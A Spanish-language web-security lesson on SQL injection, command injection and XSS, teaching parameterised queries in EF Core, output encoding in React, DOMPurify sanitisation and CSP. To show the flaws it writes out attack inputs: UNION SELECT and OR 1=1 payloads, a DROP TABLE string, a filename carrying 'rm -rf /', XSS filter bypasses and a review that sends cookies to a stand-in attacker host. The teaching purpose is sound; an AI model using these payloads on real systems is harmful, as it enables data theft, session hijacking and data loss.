# Inyección, XSS y sanitización

## En una frase

Toda inyección tiene la misma causa: **datos del usuario mezclados con código en el mismo texto**, de modo que un intérprete (SQL, el shell o el navegador) los ejecuta. La defensa no es "limpiar caracteres raros", sino **separar datos de código**: consultas parametrizadas en la base de datos y codificación de la salida en el navegador, con validación y sanitización como capas adicionales.

-----

## Antes de empezar

Conviene que ya sepas:

* Que toda entrada externa es no confiable: [Fundamentos de seguridad web](01-fundamentos-de-seguridad.md).
* SQL básico (`SELECT`, `WHERE`) y Entity Framework Core.
* Cómo React renderiza contenido: [Server y Client Components](../04-arquitectura-frontend-rendimiento-calidad/02-server-client-components.md).

Palabras nuevas (también están en el [Glosario](Glosario.md)):

* **Intérprete:** programa que ejecuta instrucciones escritas como texto: un motor SQL, el shell, el navegador.
* **Inyección SQL (SQLi):** entrada del usuario que altera la estructura de una consulta SQL.
* **Consulta parametrizada:** la consulta y los datos viajan por separado; el motor nunca interpreta los datos como SQL.
* **XSS (*Cross-Site Scripting*):** JavaScript del atacante que se ejecuta en el navegador de otro usuario, dentro de tu sitio.
* **XSS reflejado, almacenado y basado en DOM:** según si el script viene en la petición, se guarda en el servidor o se arma en el navegador.
* **Codificación de salida (*output encoding*):** convertir caracteres especiales (`<`, `>`, `"`) en su forma segura (`&lt;`, `&gt;`, `&quot;`) para que se muestren como texto.
* **Validación:** rechazar la entrada que no cumple el formato esperado.
* **Sanitización:** limpiar una entrada que **tiene** que contener HTML, dejando solo lo permitido.
* **Lista permitida (*allowlist*) / lista bloqueada (*denylist*):** permitir solo lo conocido como seguro, o bloquear lo conocido como peligroso.
* **CSP (*Content Security Policy*):** header que le dice al navegador de qué orígenes puede cargar y ejecutar scripts.

-----

## El problema

Una tienda tiene un buscador y una sección de reseñas.

El buscador arma la consulta concatenando texto:

```csharp
var sql = $"SELECT * FROM Products WHERE Name LIKE '%{q}%'";
var productos = await db.Products.FromSqlRaw(sql).ToListAsync();
```

Las reseñas se muestran tal cual las escribió el usuario:

```tsx
<div dangerouslySetInnerHTML={{ __html: resena.texto }} />
```

Alguien escribe en el buscador:

```text
' UNION SELECT Id, Email, PasswordHash, NULL, NULL FROM Users --
```

y obtiene los emails y los hashes de todas las contraseñas. Otra persona publica esta reseña:

```html
Excelente producto <img src=x onerror="fetch('https://atacante.com/?c='+document.cookie)">
```

y cada visitante que abre ese producto le envía sus cookies al atacante.

El equipo intenta arreglarlo bloqueando la palabra `<script>` y la comilla simple. Al día siguiente, el atacante usa `<svg onload=...>` y un nombre con apóstrofo (`O'Brien`) deja de funcionar en el registro.

Las consecuencias: dos vulnerabilidades críticas con la misma causa (datos mezclados con código) y una "solución" basada en bloquear caracteres que no protege y además rompe datos legítimos.

-----

## Cómo funciona

### 1. La causa común: datos que se vuelven código

Una inyección ocurre cuando un programa arma instrucciones para un intérprete **concatenando** texto que viene del usuario. El intérprete no puede distinguir qué parte escribiste tú y qué parte escribió el atacante.

| Intérprete | Inyección | Consecuencia |
| --- | --- | --- |
| Motor SQL | SQL injection | Leer, modificar o borrar datos |
| Shell del sistema operativo | Command injection | Ejecutar comandos en el servidor |
| Navegador | XSS | Ejecutar JavaScript en la sesión de otro usuario |
| Servidor LDAP | LDAP injection | Saltarse la autenticación de un directorio |
| Plantillas del servidor | Template injection | Ejecutar código en el servidor |

La defensa de fondo es siempre la misma: **usar una API que separe datos de código**, en lugar de intentar limpiar los datos.

### 2. Inyección SQL, paso a paso

Un login que arma la consulta concatenando:

```csharp
var sql = "SELECT * FROM Accounts WHERE Username = '" + usuario + "' AND Password = '" + password + "'";
```

> **Nota:** en el ejemplo Java de los apuntes originales faltaba la comilla de apertura (`... = " + USER_INPUT + "'"`). Con la comilla correcta (`... = '" + USER_INPUT + "'"`) es exactamente este patrón.

Lo que pasa con distintas entradas en el campo de contraseña:

| Entrada | Consulta resultante | Efecto |
| --- | --- | --- |
| `secreto` | `... AND Password = 'secreto'` | Normal: rechaza si no coincide |
| `' OR 1=1 --` | `... AND Password = '' OR 1=1 --'` | `1=1` siempre es verdadero y `--` comenta el resto: **inicia sesión como el primer usuario** de la tabla, a menudo el administrador |
| `'; DROP TABLE Accounts; --` | `... = ''; DROP TABLE Accounts; --'` | El `;` termina la consulta y ejecuta otra: **borra la tabla** de usuarios |
| `' UNION SELECT Username, Password FROM Accounts --` | `... UNION SELECT ...` | Agrega los resultados de otra tabla: **roba datos** |

> **Ojo:** estos ejemplos son para entender el mecanismo en entornos de práctica (tus proyectos locales, OWASP Juice Shop, DVWA). Probarlos en un sitio real sin autorización es ilegal.

### 3. La defensa: consultas parametrizadas

Con una consulta parametrizada, la consulta y los valores viajan **por separado** al motor. El motor compila la consulta primero y después recibe los valores **como datos**: nunca los interpreta como SQL, contengan lo que contengan.

```csharp
// ADO.NET
using var cmd = new SqlCommand("SELECT * FROM Accounts WHERE Username = @usuario", conexion);
cmd.Parameters.AddWithValue("@usuario", usuario);

// Dapper
var cuenta = await conexion.QuerySingleOrDefaultAsync<Cuenta>(
    "SELECT * FROM Accounts WHERE Username = @Usuario", new { Usuario = usuario });
```

**En Entity Framework Core**, las consultas LINQ ya son parametrizadas:

```csharp
// Seguro: EF Core genera un parámetro
var productos = await db.Products.Where(p => p.Name.Contains(q)).ToListAsync();
```

El riesgo aparece al escribir SQL a mano. EF Core tiene dos familias de métodos, y la diferencia es crítica:

| Método | Recibe | ¿Seguro con interpolación? |
| --- | --- | --- |
| `FromSql($"...{valor}")` | `FormattableString` | **Sí**: cada `{valor}` se convierte en un parámetro |
| `FromSqlInterpolated($"...{valor}")` | `FormattableString` | **Sí** (nombre anterior a EF Core 7) |
| `FromSqlRaw("...")` | `string` | **No**, si armas el string concatenando o interpolando |

```csharp
// SEGURO: FromSql convierte {patron} en un parámetro
var patron = $"%{q}%";
var productos = await db.Products
    .FromSql($"SELECT * FROM Products WHERE Name LIKE {patron}")
    .ToListAsync();

// VULNERABLE: el string ya está armado cuando llega a FromSqlRaw
var productos2 = await db.Products
    .FromSqlRaw($"SELECT * FROM Products WHERE Name LIKE '%{q}%'")
    .ToListAsync();
```

Los dos usan `$"..."`, pero en `FromSql` la interpolación la procesa EF Core (y genera parámetros), mientras que con `FromSqlRaw` la procesa C# **antes** de llamar al método (y genera un string concatenado). `ExecuteSql` y `ExecuteSqlRaw` funcionan igual.

> **Ojo:** los parámetros protegen **valores**, no **nombres** de columnas ni de tablas. `ORDER BY {columna}` no se puede parametrizar. Si el usuario elige por qué columna ordenar, usa una lista permitida: `columna switch { "precio" => "Price", "nombre" => "Name", _ => "Id" }`.

**Mínimo privilegio como segunda capa:** el usuario de la base de datos con el que se conecta la aplicación no necesita permisos de `DROP TABLE` ni de leer tablas de sistema. Si algún día aparece una inyección, el daño queda acotado.

### 4. Command injection

La misma idea con el sistema operativo:

```csharp
// VULNERABLE: si archivo es "foto.jpg; rm -rf /", el shell ejecuta las dos órdenes
Process.Start("/bin/sh", $"-c \"convert {archivo} salida.png\"");
```

```csharp
// MÁS SEGURO: sin shell, cada argumento por separado
var psi = new ProcessStartInfo("convert");
psi.ArgumentList.Add(archivo);
psi.ArgumentList.Add("salida.png");
Process.Start(psi);
```

Y antes de eso: valida que `archivo` sea un nombre esperado (por ejemplo, un Id que tú generaste) y, si puedes, usa una librería en lugar de invocar un programa externo.

### 5. XSS: inyección en el navegador

XSS ocurre cuando el navegador de una víctima ejecuta JavaScript del atacante **dentro de tu sitio**. Ese script corre con los mismos permisos que tu propio código: puede leer el contenido de la página, hacer peticiones a tu API con la sesión de la víctima, robar cookies que no sean `HttpOnly`, o reemplazar el formulario de login por uno falso.

| Tipo | De dónde viene el script | Ejemplo |
| --- | --- | --- |
| **Reflejado** | De la petición, y el servidor lo devuelve en la respuesta | `/buscar?q=<script>...</script>` y la página muestra "Resultados para: `<script>...`" |
| **Almacenado** | Se guarda en el servidor y se muestra a otros | Una reseña o un comentario con un script, que se ejecuta a cada visitante |
| **Basado en DOM** | El propio JavaScript del cliente lo inserta en la página | `elemento.innerHTML = location.hash.slice(1)` |

El almacenado es el más grave: un solo envío afecta a todos los que vean ese contenido.

### 6. Por qué bloquear `<script>` no funciona

Una lista bloqueada siempre pierde, porque hay demasiadas formas de ejecutar JavaScript:

```html
<script>alert("xss")</script>                     <!-- bloqueado por el filtro -->
<img src=x onerror="alert('xss')">                <!-- evento de un elemento -->
<svg onload="alert('xss')">                       <!-- otro elemento, otro evento -->
<iframe src="javascript:alert('xss')">            <!-- URL con el esquema javascript: -->
<a href="&#0000106avascript:alert('xss')">Clic</a> <!-- "j" codificada como entidad HTML -->
```

El último caso parece un link normal, pero el navegador decodifica `&#0000106` como la letra `j` y ejecuta `javascript:` al hacer clic. Cada filtro que bloquea un patrón tiene un bypass con otro.

### 7. La defensa: codificar la salida según el contexto

En lugar de buscar lo peligroso en la entrada, **codificas la salida** para que el navegador la muestre como texto, nunca como código. Cómo se codifica depende de **dónde** se inserta el dato:

| Contexto | Ejemplo | Codificación |
| --- | --- | --- |
| Contenido HTML | `<p>{dato}</p>` | `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;` |
| Atributo HTML | `<input value="{dato}">` | Además, `"` → `&quot;` y `'` → `&#x27;` |
| URL | `<a href="{dato}">` | Validar el esquema (solo `https:`, `mailto:`) y codificar con `encodeURIComponent` |
| JavaScript | `<script>var x = '{dato}'</script>` | Evitarlo: pasar los datos como JSON en un atributo `data-` |

**La buena noticia: los frameworks modernos codifican por defecto.**

| Tecnología | Seguro por defecto | La puerta de escape peligrosa |
| --- | --- | --- |
| React / JSX | `<p>{resena.texto}</p>` se muestra como texto | `dangerouslySetInnerHTML`, `href` con datos del usuario |
| Razor (ASP.NET Core) | `@Model.Texto` se codifica | `@Html.Raw(...)` |
| Angular | Interpolación `{{ texto }}` | `bypassSecurityTrustHtml` |
| Vue | `{{ texto }}` | `v-html` |
| JavaScript puro | `elemento.textContent = dato` | `elemento.innerHTML = dato` |

La regla práctica: **si no usas la puerta de escape, estás protegido**. Cada `dangerouslySetInnerHTML`, `Html.Raw`, `v-html` o `innerHTML` en tu código merece una revisión.

> **Ojo con los links en React:** React escapa el **texto**, pero un `href={usuario.web}` con el valor `javascript:alert(1)` sigue siendo peligroso: React solo muestra una advertencia en desarrollo. Valida que la URL empiece con `https://` (o usa `new URL()` y revisa `protocol`) antes de renderizarla.

### 8. Validación, sanitización y codificación: tres cosas distintas

| | Validación | Sanitización | Codificación de salida |
| --- | --- | --- | --- |
| Qué hace | **Rechaza** lo que no cumple el formato esperado | **Limpia** HTML dejando solo lo permitido | **Convierte** caracteres especiales para mostrarlos como texto |
| Cuándo | Al recibir la entrada | Cuando el contenido **tiene** que ser HTML (un editor de texto enriquecido) | Al mostrar cualquier dato |
| Ejemplo | El email tiene formato de email; la cantidad está entre 1 y 100 | Permitir `<b>`, `<i>`, `<a href="https://...">` y quitar todo lo demás | `<` → `&lt;` |
| Es la defensa principal contra XSS | No: un texto válido puede contener `<script>` | Solo si necesitas HTML | **Sí** |

**Validación con lista permitida:** valida **lo que esperas**, no lo que temes. Un código postal son 5 dígitos; un Id es un número positivo; un estado es uno de `["Pendiente", "Enviado"]`. Es más simple y más seguro que intentar detectar ataques. Pero la validación no reemplaza a la codificación: el nombre `O'Brien` es válido y contiene una comilla.

**Sanitización, solo cuando necesitas HTML:** si los usuarios escriben reseñas con negritas y links, necesitas aceptar **algo** de HTML. Ahí se usa una librería de sanitización con lista permitida, nunca expresiones regulares propias:

```csharp
// .NET: paquete HtmlSanitizer
var sanitizer = new HtmlSanitizer();
sanitizer.AllowedTags.Clear();
foreach (var tag in new[] { "b", "i", "em", "strong", "p", "a" }) sanitizer.AllowedTags.Add(tag);
sanitizer.AllowedSchemes.Clear();
sanitizer.AllowedSchemes.Add("https");

string seguro = sanitizer.Sanitize(resena.Texto);
```

```tsx
// Frontend: DOMPurify
import DOMPurify from "dompurify";

<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(resena.texto) }} />
```

¿Dónde sanitizar? Lo más seguro es hacerlo **al mostrar**, porque las reglas pueden cambiar y el mismo dato puede mostrarse en contextos distintos (HTML, un email, un PDF). Si sanitizas al guardar, guarda también el original o asegúrate de no volver a "des-sanitizarlo".

### 9. CSP: la red de seguridad del navegador

**Content Security Policy** es un header que le dice al navegador desde dónde puede cargar y ejecutar scripts. Si un atacante logra inyectar un `<script>` o un `onerror`, una CSP estricta impide que se ejecute.

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
```

| Directiva | Significado |
| --- | --- |
| `default-src 'self'` | Por defecto, solo recursos del propio dominio |
| `script-src 'self'` | Scripts solo del propio dominio: bloquea scripts inline y `onerror=` |
| `object-src 'none'` | Sin plugins (`<object>`, `<embed>`) |
| `frame-ancestors 'none'` | Nadie puede meter tu sitio en un `<iframe>` (previene *clickjacking*) |

Es **defensa en profundidad**, no un reemplazo de la codificación: una CSP mal configurada (con `'unsafe-inline'`) no protege casi nada. Para empezar sin romper el sitio, se puede usar `Content-Security-Policy-Report-Only`, que solo informa las violaciones.

-----

## Ejemplo completo

El buscador y las reseñas del problema, corregidos.

`ProductsController.cs` (búsqueda parametrizada y orden con lista permitida):

```csharp
[AllowAnonymous]
[HttpGet("api/v1/products")]
public async Task<List<ProductDto>> Buscar([FromQuery] BuscarProductosRequest req, CancellationToken ct)
{
    var consulta = db.Products.AsQueryable();

    if (!string.IsNullOrWhiteSpace(req.Q))
        consulta = consulta.Where(p => p.Name.Contains(req.Q)); // EF Core lo parametriza

    consulta = req.Orden switch                                  // lista permitida, no SQL dinámico
    {
        "precio" => consulta.OrderBy(p => p.Price),
        "nombre" => consulta.OrderBy(p => p.Name),
        _ => consulta.OrderBy(p => p.Id)
    };

    return await consulta.Take(50).Select(p => new ProductDto(p.Id, p.Name, p.Price)).ToListAsync(ct);
}

public record BuscarProductosRequest(
    [property: MaxLength(100)] string? Q,
    [property: RegularExpression("^(precio|nombre)$")] string? Orden);
```

`ReviewsController.cs` (las reseñas se guardan tal cual, validadas en longitud):

```csharp
public record CrearResenaRequest(
    [property: Required, MaxLength(2000)] string Texto,
    [property: Range(1, 5)] int Estrellas);
```

`resena.tsx` (se sanitiza al mostrar, con la lista permitida mínima):

```tsx
import DOMPurify from "dompurify";

const CONFIG = { ALLOWED_TAGS: ["b", "i", "em", "strong", "p", "br"], ALLOWED_ATTR: [] };

export function Resena({ resena }: { resena: ResenaDto }) {
  return (
    <article>
      <p>{resena.autor}</p> {/* texto: React lo codifica solo */}
      <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(resena.texto, CONFIG) }} />
    </article>
  );
}
```

`Program.cs` (CSP como segunda capa):

```csharp
app.Use(async (ctx, next) =>
{
    ctx.Response.Headers.ContentSecurityPolicy =
        "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'";
    ctx.Response.Headers.XContentTypeOptions = "nosniff";
    await next();
});
```

Prueba de que la inyección ya no funciona:

```csharp
[Fact]
public async Task Buscar_ConInyeccionSql_NoDevuelveUsuarios()
{
    var respuesta = await _client.GetAsync(
        "/api/v1/products?q=' UNION SELECT Id, Email, PasswordHash FROM Users --");

    respuesta.EnsureSuccessStatusCode();
    var productos = await respuesta.Content.ReadFromJsonAsync<List<ProductDto>>();
    Assert.Empty(productos!); // se buscó literalmente ese texto como nombre de producto
}
```

Qué observar:

* El texto malicioso del buscador se trata como un **dato**: se buscan productos cuyo nombre contenga literalmente esa frase, y no hay ninguno.
* El apóstrofo de `O'Brien` vuelve a funcionar: no se bloquean caracteres, se separan datos de código.
* El nombre del autor no necesita nada: JSX lo codifica. Solo el contenido con formato pasa por DOMPurify.
* La reseña con `<img onerror=...>` se muestra sin el atributo `onerror`; y aunque se escapara algo, la CSP bloquea los scripts inline.
* No quedó ningún `FromSqlRaw` con interpolación ni ningún `dangerouslySetInnerHTML` sin sanitizar.

-----

## Errores comunes

**1. Concatenar o interpolar valores en SQL.**
Qué pasa: inyección SQL.
Por qué: datos del usuario mezclados con el texto de la consulta.
Arreglo: LINQ, `FromSql` con interpolación, o parámetros explícitos (`@usuario`).

**2. Usar `FromSqlRaw` con `$"..."`.**
Qué pasa: inyección, aunque "se usó EF Core".
Por qué: C# arma el string antes de que EF Core lo vea.
Arreglo: `FromSql($"...")`; `FromSqlRaw` solo con texto fijo y parámetros explícitos.

**3. Filtrar con listas bloqueadas.**
Qué pasa: el atacante usa otra etiqueta, otro evento u otra codificación; y los datos legítimos (`O'Brien`) se rompen.
Por qué: se intenta adivinar todas las formas de un ataque.
Arreglo: separar datos de código (parámetros, codificación de salida) y validar con lista permitida.

**4. `dangerouslySetInnerHTML` o `Html.Raw` con contenido del usuario.**
Qué pasa: XSS almacenado.
Por qué: se usa la puerta de escape para "mostrar el formato".
Arreglo: texto plano siempre que se pueda; si hace falta HTML, sanitizar con DOMPurify o HtmlSanitizer.

**5. Confiar en la validación del frontend.**
Qué pasa: el atacante llama a la API directamente con `curl` y salta la validación.
Por qué: se asume que todo pasa por el formulario.
Arreglo: la validación del frontend es para la experiencia de usuario; la del servidor es la que protege.

**6. Sanitizar con expresiones regulares propias.**
Qué pasa: bypasses con mayúsculas, entidades, etiquetas anidadas o atributos que no se previeron.
Por qué: el HTML es demasiado complejo para una expresión regular.
Arreglo: una librería mantenida, configurada con lista permitida.

-----

## Evolución y versiones

* **1998:** se publica uno de los primeros artículos sobre inyección SQL (Phrack).
* **2000:** Microsoft describe el XSS en un aviso de seguridad.
* **2012:** CSP nivel 1 se convierte en recomendación del W3C.
* **2017:** Injection y XSS son categorías separadas en el OWASP Top 10 (A1 y A7).
* **2021:** XSS pasa a formar parte de Injection.
* **EF Core 7 (2022):** `FromSql` y `ExecuteSql` aceptan `FormattableString` y parametrizan la interpolación; `FromSqlInterpolated` queda como nombre anterior.

-----

## Cuándo sí y cuándo no

**Usa consultas parametrizadas siempre:** no hay ningún caso legítimo para concatenar valores del usuario en SQL.

**Usa sanitización cuando:** el contenido **tiene** que ser HTML, como en un editor de texto enriquecido.

**No sanitices cuando:** el contenido es texto plano (nombres, comentarios sin formato). Ahí alcanza con que el framework codifique la salida, y sanitizar solo deforma los datos.

-----

## Resumen en 5 líneas

1. Toda inyección es datos del usuario mezclados con código; la defensa es separarlos, no "limpiar" caracteres.
2. SQL: LINQ o `FromSql` con interpolación (parametrizados); nunca `FromSqlRaw` con `$"..."`; listas permitidas para columnas.
3. XSS: los frameworks codifican por defecto; cada `dangerouslySetInnerHTML`, `Html.Raw` o `innerHTML` es un riesgo a revisar.
4. Validación rechaza, sanitización limpia HTML necesario, codificación muestra como texto: son tres cosas distintas.
5. CSP y mínimo privilegio en la base de datos son la segunda capa, no la primera.

-----

## Para profundizar

<details>
<summary>Inyección en otros lugares: NoSQL, logs y cabeceras</summary>

* **NoSQL:** en MongoDB, si el body `{ "password": { "$ne": null } }` llega directo a un filtro, la condición "contraseña distinta de null" es verdadera para todos. Defensa: deserializar a tipos concretos (un `string`, no un objeto arbitrario).
* **Logs:** un usuario con el nombre `ana\n2026-10-24 INFO login.ok user=admin` puede falsificar líneas en un log de texto plano. Defensa: logging estructurado (los valores van en campos, no en el texto).
* **Cabeceras HTTP:** insertar `\r\n` en un valor que termina en una cabecera puede agregar cabeceras falsas. ASP.NET Core rechaza esos caracteres en las cabeceras de respuesta.

</details>

<details>
<summary>Trusted Types: XSS basado en DOM bloqueado por el navegador</summary>

Con la directiva CSP `require-trusted-types-for 'script'`, los navegadores basados en Chromium **rechazan** asignaciones de strings a `innerHTML`, `eval` y similares, salvo que el valor pase por una política de sanitización registrada. Convierte cada `innerHTML = textoDelUsuario` en un error, en lugar de una vulnerabilidad. Es especialmente útil en aplicaciones grandes, donde es difícil revisar todo el JavaScript.

</details>

-----

## En entrevista

### Respuesta corta (junior)

La inyección SQL ocurre cuando se arma una consulta concatenando lo que escribe el usuario. Se previene con consultas parametrizadas, que en EF Core son automáticas con LINQ. El XSS es cuando se ejecuta JavaScript del atacante en el navegador; se previene escapando la salida, algo que React hace por defecto.

### Respuesta ampliada (semi-senior)

Toda inyección tiene la misma causa: datos mezclados con código. Por eso no filtro caracteres, sino que uso APIs que los separan. En SQL uso LINQ o `FromSql` con interpolación, que EF Core convierte en parámetros, y sé que `FromSqlRaw` con `$"..."` es vulnerable; para ordenar por columnas elegidas por el usuario uso listas permitidas. Para XSS confío en la codificación por defecto de React o Razor, reviso cada `dangerouslySetInnerHTML` o `Html.Raw`, valido los esquemas de las URLs en los `href`, y si el contenido tiene que ser HTML lo sanitizo con DOMPurify o HtmlSanitizer con lista permitida. Valido la entrada en el servidor con listas permitidas, y agrego una CSP estricta y mínimo privilegio en la base de datos como segunda capa.

### Preguntas frecuentes de seguimiento

**1. ¿Por qué no alcanza con escapar las comillas en SQL?**
Porque hay muchos casos que el escape manual no cubre (otras codificaciones, contextos numéricos sin comillas, nombres de columnas). La consulta parametrizada no depende de escapar: los datos nunca se interpretan como SQL.

**2. ¿Qué diferencia hay entre XSS reflejado y almacenado?**
El reflejado viene en la petición y afecta a quien abre ese link; el almacenado se guarda en el servidor y afecta a todos los que ven ese contenido.

**3. ¿Validar la entrada previene XSS?**
No por sí sola: un texto puede ser válido y contener `<`. La defensa principal es codificar la salida según el contexto; la validación es una capa más.

-----

## Práctica

**Ejercicio 1.** ¿Cuáles de estas consultas son vulnerables a inyección SQL?

```csharp
// 1
db.Users.Where(u => u.Email == email).FirstOrDefaultAsync();

// 2
db.Users.FromSqlRaw($"SELECT * FROM Users WHERE Email = '{email}'").FirstOrDefaultAsync();

// 3
db.Users.FromSql($"SELECT * FROM Users WHERE Email = {email}").FirstOrDefaultAsync();

// 4
db.Users.FromSqlRaw("SELECT * FROM Users WHERE Email = {0}", email).FirstOrDefaultAsync();

// 5
db.Database.ExecuteSqlRaw($"DELETE FROM Logs WHERE Fecha < '{fecha}'");
```

<details>
<summary>Solución</summary>

1. **Segura:** LINQ, parametrizada por EF Core.
2. **Vulnerable:** la interpolación la resuelve C# antes; llega un string ya armado.
3. **Segura:** `FromSql` recibe un `FormattableString` y parametriza `{email}`.
4. **Segura:** `FromSqlRaw` con marcadores `{0}` y los valores como argumentos separados se parametriza.
5. **Vulnerable:** mismo problema que la 2. Corrección: `ExecuteSql($"DELETE FROM Logs WHERE Fecha < {fecha}")`.

</details>

**Ejercicio 2.** ¿Qué riesgos tiene este componente? Corrígelo.

```tsx
function PerfilPublico({ usuario }: { usuario: UsuarioDto }) {
  return (
    <div>
      <h2 dangerouslySetInnerHTML={{ __html: usuario.nombre }} />
      <a href={usuario.sitioWeb}>Mi sitio</a>
      <p>{usuario.biografia}</p>
    </div>
  );
}
```

<details>
<summary>Solución</summary>

* **`nombre` con `dangerouslySetInnerHTML`:** XSS almacenado. Un nombre no necesita HTML: debe ser texto.
* **`href` con datos del usuario:** `javascript:alert(document.cookie)` se ejecuta al hacer clic. Hay que validar el esquema.
* **`biografia`:** está bien, JSX la codifica.

```tsx
function urlSegura(valor: string): string | undefined {
  try {
    const url = new URL(valor);
    return url.protocol === "https:" ? url.toString() : undefined;
  } catch {
    return undefined;
  }
}

function PerfilPublico({ usuario }: { usuario: UsuarioDto }) {
  const sitio = urlSegura(usuario.sitioWeb);
  return (
    <div>
      <h2>{usuario.nombre}</h2>
      {sitio && <a href={sitio} rel="noopener noreferrer" target="_blank">Mi sitio</a>}
      <p>{usuario.biografia}</p>
    </div>
  );
}
```

Y la misma validación de la URL debería hacerse en el servidor al guardar el perfil.

</details>

-----

## Siguiente lección

[Autenticación y datos sensibles](05-autenticacion-y-datos-sensibles.md)
